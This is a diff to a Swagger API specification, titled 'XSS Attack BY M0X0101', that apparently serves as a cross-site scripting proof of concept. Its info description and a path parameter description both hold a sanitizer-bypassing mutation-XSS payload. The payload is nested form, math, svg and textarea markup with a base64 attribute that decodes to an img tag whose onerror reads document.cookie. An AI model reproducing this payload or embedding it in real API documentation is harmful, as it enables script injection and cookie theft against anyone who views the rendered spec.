@@ -1,5 +1,38 @@
 swagger: '2.0'
 info:
-  title: n
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="PC90ZXh0YXJlYT48aW1nIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9MT4="></form>
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="PC90ZXh0YXJlYT48aW1nIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9MT4="></form>
   version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="PC90ZXh0YXJlYT48aW1nIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9MT4="></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
